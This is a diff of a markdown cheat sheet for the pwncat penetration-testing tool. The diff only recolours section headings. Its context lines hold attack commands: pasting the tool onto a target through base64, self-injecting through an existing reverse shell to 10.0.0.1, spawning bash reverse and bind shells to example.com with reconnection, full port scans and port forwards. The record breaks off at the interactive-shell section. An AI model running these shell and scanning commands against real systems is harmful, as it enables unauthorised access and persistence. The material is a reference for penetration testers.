@@ -6,7 +6,7 @@
 pip install pwncat
 ```
 
-## Deploy to target
+## <mark style="color:red;">Deploy to target</mark>
 
 ```
 # Copy base64 data to clipboard from where you have internet access
@@ -17,7 +17,7 @@ curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64
 chmod +x pwncat
 ```
 
-## Inject to target
+## <mark style="color:red;">Inject to target</mark>
 
 If you found a vulnerability on the target to start a very simple reverse shell, such as via bash, php, perl, python, nc or similar, you can instruct your local pwncat listener to use this connection to deploy itself on the target automatically and start an additional unbreakable reverse shell back to you.
 
@@ -25,7 +25,7 @@ If you found a vulnerability on the target to start a very simple reverse shell,
 pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445
 ```
 
-## Summon shells
+## <mark style="color:red;">Summon shells</mark>
 
 ```
 # Bind shell (accepts new clients after disconnect)
@@ -38,7 +38,7 @@ pwncat -e '/bin/bash' example.com 4444 --reconn --recon-wait 1
 pwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 1
 ```
 
-## Port scan
+## <mark style="color:red;">Port scan</mark>
 
 ```
 # [TCP] IPv4 + IPv6
@@ -59,9 +59,9 @@ pwncat -z 10.0.0.1 1-65535 -6 -u
 pwncat -z 10.0.0.1 1-65535 --banner
 ```
 
-## &#x20;Port Forward
+## <mark style="color:red;">Port Forward</mark>
 
-### Local port forward -L (listening proxy)
+### <mark style="color:orange;">Local port forward -L (listening proxy)</mark>
 
 ```
 # Make remote MySQL server (remote port 3306) available on current machine
@@ -72,7 +72,7 @@ pwncat -L 0.0.0.0:5000 everythingcli.org 3306
 pwncat -L 0.0.0.0:5000 everythingcli.org 3306 -u
 ```
 
-### Remote port forward -R (double client proxy)
+### <mark style="color:orange;">Remote port forward -R (double client proxy)</mark>
 
 ```
 # Connect to Remote MySQL server (remote port 3306) and then connect to another
@@ -83,7 +83,7 @@ pwncat -R 10.0.0.1:4444 everythingcli.org 3306
 pwncat -R 10.0.0.1:4444 everythingcli.org 3306 -u
 ```
 
-## Interactive Shell
+## <mark style="color:red;">Interactive Shell</mark>
 
 ```
 Unbreakable TCP reverse shell
